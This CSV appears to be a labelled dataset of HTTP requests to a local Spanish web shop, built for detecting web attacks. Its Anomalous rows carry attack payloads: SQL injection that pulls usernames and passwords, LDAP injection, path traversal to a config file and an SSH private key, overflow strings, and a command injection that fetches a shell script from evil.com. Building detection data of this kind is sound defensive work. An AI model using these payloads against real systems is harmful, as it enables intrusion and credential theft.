Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=A260DB98D57CEBB3FC4E0FAC30EA0EF5,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F34FDEBCA7AECBBFAE5CA4EB5980ACAB,application/x-www-form-urlencoded,close,99,nombre=Carlos+Martinez&apellidos=Apellido&correo=juan@mail.com&password=Pass1234&telefono=686547283,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=05CBB4D9A37F51629CCCAF4C7A3DDA1E,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users-- HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=418B015BC2BC0BD8D62A1D461C5BC129,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=6&nombre=Cerveza+Artesanal&precio=61&cantidad=49&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F5231C7C8CC64B8BF9BD6C87FEE7EB7C,application/x-www-form-urlencoded,close,96,nombre=Juan+Garcia&apellidos=Apellido&correo=maria@mail.com&password=Pass1234&telefono=635322628,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=FAC8E9ABF0EDFE3E651BF78CCC47C07D,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=49&nombre=Vino+Rioja&precio=260&cantidad=81&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=C7C03E0FD3CD6C2D5FA8A37F0CC3CB78,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%27%20OR%20%27x%27%3D%27x HTTP/1.1
Anomalous,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=02E928C1A7E2D246BC99F1C77B07EDFF,application/x-www-form-urlencoded,close,828,correo=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&password=pass,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=6AFEA6B9FA8C87D9A7D7EFD45FC82AB4,application/x-www-form-urlencoded,close,35,correo=admin%27--&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=6B3CFB42B6423C2D9150FAAACDAB913E,application/x-www-form-urlencoded,close,101,nombre=Carlos+Martinez&apellidos=Apellido&correo=carlos@mail.com&password=Pass1234&telefono=620496359,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DD1B577C3BBCFC71912FA158BFF91C15,application/x-www-form-urlencoded,close,40,correo=carlos@mail.com&password=APNPflYT,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=AE1E3339DCCECA5AF8DCE9FABA9E04BC,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=../../../../../WEB-INF/classes/config.properties HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E93C1DC7C05AFA46CDB9BBB7FAB097D2,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=rioja HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=BFFFEB3C02D28F25FEE1640BC0B7978F,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=cerveza HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=BABB2C7E2C71CDF3D80AC6EAFEC933AC,application/x-www-form-urlencoded,close,67,correo=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=FAE922C3F90CBABBEFBAD57470B69FCA,application/x-www-form-urlencoded,close,37,correo=ana@mail.com&password=xZFUw3Ig,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=BA45C0EEB4A05E4BEBA82B8EB19AE3B7,application/x-www-form-urlencoded,close,71,correo=1%20OR%20BENCHMARK%281000000%2CMD5%281%29%29--&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DAFCC6B001BD90EF181A7DA2BF2C6CB7,application/x-www-form-urlencoded,close,45,correo=%2A%28%29%7C%2526%27&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F6FE6CFA1DAD6BD7EDEFECDDE69CA16A,,close,,,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=37&nombre=Cerveza+Artesanal&precio=188&cantidad=74&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=BBC1DDE8909B2F2E0B38CD0BB2452388,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41 HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=ADA99AB2F9CEB6E3EFC388E883DC274D,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=42&nombre=Vino+Rioja&precio=421&cantidad=35&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DED5AF6856DB8CA7B97BFEAA9FAEF2D7,application/x-www-form-urlencoded,close,35,correo=admin%27--&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E7DEF6AFAD63E44DFF0FEBCAB5CE455B,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=29&nombre=Aceite+Oliva&precio=329&cantidad=27&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E0A675BF6D91ABCDCA82FCFEBFD3AD38,application/x-www-form-urlencoded,close,37,correo=ana@mail.com&password=sT77r3Or,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=EA9887CCBC3B6D3DEAFCA8A8213C3A57,application/x-www-form-urlencoded,close,40,correo=1%20AND%201%3D1&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DE2EDEFE63EFFBA6D5C0FD40B3849AC2,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%27%20OR%20%271%27%3D%271%27-- HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=1E870570DE1A196EAAF84ABDFDB35C81,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?id=12&nombre=Queso+Manchego&precio=353&cantidad=85&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=08F39B89E21D15AB1765A57948CDAD4D,application/x-www-form-urlencoded,close,40,correo=carlos@mail.com&password=gnPDwVsp,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=475252EC3DA543DB72E54B64007096B9,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=33&nombre=Cerveza+Artesanal&precio=466&cantidad=78&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E9B8EA88BD675392DDBD1EE1170FCE3B,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?nombre=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh/id_rsa HTTP/1.1
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DD0578FB0C39EB5FE0FCB7C5EA3CD5D0,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=item%3B%20wget%20http%3A//evil.com/shell.sh HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=9E71CF39BBE8EFE2F6FC0B13CCA9F2E3,,close,,,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=14&nombre=Vino+Rioja&precio=217&cantidad=24&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E05BA9F2441C3058AED82ADBD8D56E32,application/x-www-form-urlencoded,close,67,correo=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=997171AF2AD5D55FA8A3583FCB61EEFC,application/x-www-form-urlencoded,close,39,correo=maria@mail.com&password=cK9vgBya,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=9F95B169FA6DB36780CE1BCC944DB7EF,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=41&nombre=Jamon+Iberico&precio=265&cantidad=33&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=7DDC390BDA25E3F35EEFA7CBFCCC07B4,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=37&nombre=Aceite+Oliva&precio=302&cantidad=73&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=6F3E37CC93B1F5AB31DD7EA1E0BE5EF2,application/x-www-form-urlencoded,close,50,correo=%27%20OR%20%27x%27%3D%27x&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
